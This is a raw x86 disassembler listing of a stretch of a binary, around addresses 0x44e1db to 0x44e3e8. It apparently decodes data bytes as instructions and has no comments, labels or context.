  44e1db:	add    BYTE PTR [eax+eax*1-0x7fd773d6],ah
  44e1e2:	inc    eax
  44e1e3:	add    BYTE PTR [eax+0x4],al
  44e1e6:	add    BYTE PTR [edx],bl
  44e1e8:	dec    eax
  44e1e9:	or     BYTE PTR [eax],dl
  44e1eb:	add    DWORD PTR [eax+eax*1],eax
  44e1ee:	add    BYTE PTR [eax+0x30],dl
  44e1f1:	rol    BYTE PTR [eax+eax*1],0x40
  44e1f5:	add    DWORD PTR [edx],0x1
  44e1fb:	fmul   QWORD PTR [esi]
  44e1fd:	inc    eax
  44e1fe:	inc    eax
  44e1ff:	inc    eax
  44e200:	add    BYTE PTR [eax],al
  44e202:	rcl    BYTE PTR [eax+eax*1],0x30
  44e206:	and    BYTE PTR [eax+0x208640],ah
  44e20c:	add    DWORD PTR [ecx+eiz*4],eax
  44e20f:	pop    eax
  44e210:	add    al,0x0
  44e212:	adc    DWORD PTR [eax],0x80e0184a
  44e218:	xor    eax,eax
  44e21a:	add    al,0x2
  44e21c:	mov    al,BYTE PTR [eax]
  44e21e:	mov    al,al
  44e220:	and    BYTE PTR [eax+edx*1],cl
  44e223:	add    BYTE PTR [eax],al
  44e225:	test   eax,eax
  44e227:	add    BYTE PTR [esi],al
  44e229:	xchg   BYTE PTR [edx+0x100018],al
  44e22f:	add    BYTE PTR [esi],cl
  44e231:	dec    edx
  44e232:	test   BYTE PTR ds:0x20201040,dl
  44e238:	inc    eax
  44e239:	sbb    al,0x44
  44e23b:	add    BYTE PTR [eax],al
  44e23d:	adc    BYTE PTR [edx+eax*2+0x1],dl
  44e241:	and    BYTE PTR [ebx+0x24],0x88
  44e245:	add    al,0x1
  44e247:	adc    cl,BYTE PTR [ecx]
  44e249:	add    BYTE PTR [eax],al
  44e24b:	push   0x6005e400
  44e250:	adc    DWORD PTR [ecx-0x18],0x61
  44e254:	loope  0x44e266
  44e256:	add    BYTE PTR [ebp-0x6e],dl
  44e259:	add    BYTE PTR [eax],al
  44e25b:	inc    edx
  44e25c:	add    BYTE PTR [eax],al
  44e25e:	add    al,0x80
  44e260:	add    BYTE PTR [eax-0x80],al
  44e263:	add    BYTE PTR [eax+0xc],ah
  44e266:	add    BYTE PTR [ebx],al
  44e268:	or     BYTE PTR [eax],0x11
  44e26b:	sbb    BYTE PTR [eax+0x2404082],al
  44e271:	add    BYTE PTR [eax],dl
  44e273:	add    DWORD PTR [eax+eax*1-0x38],ecx
  44e277:	add    al,0x3a
  44e279:	and    BYTE PTR [ecx],ah
  44e27b:	adc    BYTE PTR [eax+eax*1],cl
  44e27e:	and    DWORD PTR [eax+0x820140],eax
  44e284:	rol    DWORD PTR [ecx+0x44],cl
  44e287:	add    al,BYTE PTR [eax+eax*2]
  44e28a:	sbb    eax,0x8014020
  44e28f:	aad    0x15
  44e291:	daa    
  44e292:	inc    edx
  44e293:	or     BYTE PTR [eax+0x10300800],ah
  44e299:	adc    DWORD PTR [eax+eax*1+0x0],eax
  44e29d:	pusha  
  44e29e:	cdq    
  44e29f:	and    BYTE PTR [eax],al
  44e2a1:	or     BYTE PTR [ecx],dl
  44e2a3:	add    al,BYTE PTR [eax+0x40600024]
  44e2a9:	add    BYTE PTR [eax+0x19],al
  44e2ac:	and    BYTE PTR [esi],al
  44e2ae:	inc    esp
  44e2af:	and    BYTE PTR [eax],al
  44e2b1:	add    DWORD PTR [eax-0x7697b580],esi
  44e2b7:	test   BYTE PTR [ecx],ch
  44e2b9:	rcl    ch,0x41
  44e2bc:	add    BYTE PTR [eax],dl
  44e2be:	sub    BYTE PTR [eax],al
  44e2c0:	sub    DWORD PTR [esi+edx*1],esi
  44e2c3:	add    BYTE PTR [eax+0x1],al
  44e2c6:	add    BYTE PTR [edx+0x100080],al
  44e2cc:	add    BYTE PTR [eax],al
  44e2ce:	lock inc eax
  44e2d0:	pusha  
  44e2d1:	dec    esp
  44e2d2:	add    BYTE PTR [eax],dh
  44e2d4:	add    DWORD PTR [eax-0x7ffbadc0],ebx
  44e2da:	nop
  44e2db:	add    eax,0x4040ae00
  44e2e0:	adc    dh,al
  44e2e2:	inc    edi
  44e2e3:	leave  
  44e2e4:	cdq    
  44e2e5:	add    BYTE PTR [eax],al
  44e2e7:	add    BYTE PTR [eax],al
  44e2e9:	mov    BYTE PTR [eax],al
  44e2eb:	add    BYTE PTR [eiz*1+0x4091c00],dl
  44e2f2:	mov    BYTE PTR ds:0x7620b0,cl
  44e2f8:	add    BYTE PTR [eax+0x3],al
  44e2fb:	add    DWORD PTR [eax],esi
  44e2fd:	cmp    BYTE PTR [eax],0x40
  44e300:	and    eax,DWORD PTR [eax+0x0]
  44e303:	add    BYTE PTR [eax],cl
  44e305:	and    edx,DWORD PTR [eax]
  44e307:	sbb    eax,0x81000048
  44e30c:	push   ebx
  44e30d:	and    esp,eax
  44e30f:	add    al,0x0
  44e311:	dec    edx
  44e312:	adc    DWORD PTR [eax],eax
  44e314:	pop    ecx
  44e315:	inc    eax
  44e316:	add    BYTE PTR [eax],al
  44e318:	and    BYTE PTR [esi],dl
  44e31a:	inc    eax
  44e31b:	test   BYTE PTR [edx],ah
  44e31d:	add    ah,BYTE PTR [edi]
  44e31f:	add    BYTE PTR [eax+0x0],ah
  44e322:	add    BYTE PTR [eax],ah
  44e324:	add    BYTE PTR [ecx+0x20000209],bl
  44e32a:	and    BYTE PTR [edx+0x14],al
  44e32d:	adc    BYTE PTR [eax],ah
  44e32f:	add    BYTE PTR [eax+0x20],al
  44e332:	mov    al,BYTE PTR [eax+edx*1+0x0]
  44e336:	add    BYTE PTR [eax],al
  44e338:	add    BYTE PTR [eax],al
  44e33a:	add    BYTE PTR [eax+0x24],dl
  44e33d:	or     DWORD PTR [eax],0x200c4008
  44e343:	adc    al,al
  44e345:	add    al,0xb
  44e347:	or     DWORD PTR [edx+0x41],eax
  44e34a:	inc    esp
  44e34b:	push   es
  44e34c:	add    BYTE PTR [ecx],0x2
  44e34f:	inc    esp
  44e350:	rol    BYTE PTR [eax],0x5
  44e353:	mov    dl,BYTE PTR [edx]
  44e355:	mov    BYTE PTR [edx],al
  44e357:	pop    ecx
  44e358:	or     BYTE PTR [eax],bh
  44e35a:	add    BYTE PTR [eax],bl
  44e35c:	and    BYTE PTR ds:0x97008c,ah
  44e362:	(bad)  
  44e363:	hlt    
  44e364:	add    BYTE PTR [ecx],al
  44e366:	and    BYTE PTR [eax+0x200800a0],al
  44e36c:	es dec eax
  44e36e:	ror    BYTE PTR [eax+eax*1+0x1],0x21
  44e373:	dec    esi
  44e374:	enter  0x4008,0x50
  44e378:	pusha  
  44e379:	add    BYTE PTR [eax],0x50
  44e37c:	add    al,0x21
  44e37e:	sub    al,0x6b
  44e380:	inc    esp
  44e381:	inc    eax
  44e382:	add    eax,0x80022895
  44e387:	add    BYTE PTR [eax],al
  44e389:	add    dl,BYTE PTR [eax]
  44e38b:	add    BYTE PTR [eax],cl
  44e38d:	dec    eax
  44e38e:	add    BYTE PTR [eax],dl
  44e390:	add    eax,0x65416022
  44e395:	add    BYTE PTR [eax-0x16],al
  44e398:	add    BYTE PTR [eax+0x35],ch
  44e39b:	mov    ah,0x81
  44e39d:	test   BYTE PTR [eax],al
  44e39f:	add    cl,BYTE PTR [eax+ebx*2]
  44e3a2:	or     ah,dl
  44e3a4:	sbb    BYTE PTR [eax+0x0],dl
  44e3a7:	add    DWORD PTR [eax+esi*1],eax
  44e3aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44e3ab:	adc    al,0x20
  44e3ad:	inc    eax
  44e3ae:	or     al,BYTE PTR [eax]
  44e3b0:	add    BYTE PTR [ecx],al
  44e3b2:	push   eax
  44e3b3:	or     BYTE PTR [ecx-0x2e],al
  44e3b6:	and    BYTE PTR [ecx],al
  44e3b8:	xor    BYTE PTR [eax],ch
  44e3ba:	sub    DWORD PTR es:[eax],0x2c0068
  44e3c1:	add    BYTE PTR [eax],al
  44e3c3:	add    al,BYTE PTR [eax]
  44e3c5:	add    BYTE PTR [eax],al
  44e3c7:	add    dh,BYTE PTR [eax]
  44e3c9:	inc    ecx
  44e3ca:	and    al,0x61
  44e3cc:	inc    ecx
  44e3cd:	mov    al,ds:0x208401a1
  44e3d2:	add    BYTE PTR [eax],ah
  44e3d4:	add    al,0x80
  44e3d6:	add    BYTE PTR [eax],al
  44e3d8:	and    eax,DWORD PTR [ecx]
  44e3da:	add    BYTE PTR [eax],al
  44e3dc:	xchg   BYTE PTR [eax],al
  44e3de:	mov    bl,0x0
  44e3e0:	add    BYTE PTR [edx+0x4100008],al
  44e3e6:	and    ch,ah
  44e3e8:	add    al,0x0
